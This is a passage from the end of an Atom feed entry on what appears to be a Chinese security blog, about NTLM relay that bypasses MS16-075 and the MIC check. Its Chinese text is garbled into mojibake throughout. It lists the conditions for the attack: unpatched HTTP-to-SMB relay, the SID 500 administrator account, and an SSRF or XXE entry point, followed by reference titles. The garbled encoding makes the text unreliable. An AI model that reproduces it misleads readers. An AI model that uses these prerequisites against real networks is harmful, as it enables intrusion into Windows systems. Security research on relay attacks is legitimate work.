class="headerlink" title="æˆåŠŸæ¡ä»¶"></a>æˆåŠŸæ¡ä»¶</h2><p>â€¢ http-&gt;smbæœªæ‰“æ–°è¡¥ä¸<br>â€¢ å·¥ä½œæ¡ä»¶ç¯å¢ƒä¸‹éœ€è¦administratorï¼ˆsid 500ï¼‰<br>â€¢ ä¸€ä¸ªssrfæˆ–è€…xxeçš„ç‚¹</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p>Ntlm Relay is dead, Long Live Ntlm Relay<br>Ntlm-Relay-Reloaded-Attack-methods-you-do-not-know<br>ntlmrelay</p>]]></content>
    
    <summary type="html">
    
      ç»•è¿‡ MS16-075 å’Œ MICæ ¡éªŒè¿›è¡Œntlm relay
    
    </summary>
    
    
      <category term="windows security" scheme="https://cl0und.github.io/categories/windows-security/"/>
    
    
      <category term="java" scheme="https://cl0und.github.io/tags/java/"/>
    
      <category term="windows" scheme="https://cl0und.github.io/tags/windows/"/>
    
  </entry>
  
</feed>
